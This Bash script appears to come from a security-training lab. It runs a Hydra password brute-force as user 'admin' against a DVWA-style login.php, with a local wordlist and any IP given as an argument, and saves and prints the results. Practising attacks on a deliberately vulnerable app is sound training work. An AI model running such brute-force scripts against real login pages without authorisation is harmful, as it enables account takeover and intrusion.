#!/usr/bin/env bash
# denis-play-backend/plays/play-02-hydra-dvwa/run.sh

# Vai para a pasta onde este script está
cd "$(dirname "$0")"

# IP recebido como primeiro argumento, ou localhost se não vier nada
IP=${1:-127.0.0.1}

echo "[*] Iniciando ataque com Hydra contra $IP..."
sleep 1

# Hydra vai ler a wordlist local passwords.txt
hydra -l admin \
      -P passwords.txt \
      http://$IP/login.php \
      -v -t 4 \
    > resultado.txt

echo
echo "[📄] Saída do Hydra:"
cat resultado.txt
echo
echo "[✔️] Teste concluído com sucesso."
